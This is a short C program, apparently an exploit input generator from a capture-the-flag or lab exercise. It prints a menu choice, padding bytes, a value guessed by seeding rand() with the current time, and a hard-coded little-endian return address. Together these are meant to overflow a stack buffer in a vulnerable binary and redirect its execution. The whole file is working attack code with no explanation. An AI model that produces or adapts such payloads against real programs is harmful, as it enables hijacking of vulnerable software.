#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main()
{
    unsigned int n;
    srand(time(0));
    n = rand();
    unsigned char bytes[4];

    bytes[0] = (n >> 24) & 0xFF;
    bytes[1] = (n >> 16) & 0xFF;
    bytes[2] = (n >> 8) & 0xFF;
    bytes[3] = n & 0xFF;
    printf("2\n"); 
    printf("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK%c%c%c%cMMMMNNNN\xb6\x12\x40\x00", bytes[3],bytes[2],bytes[1],bytes[0]);
    /*printf("%lld", rand());*/
    return 0;
}
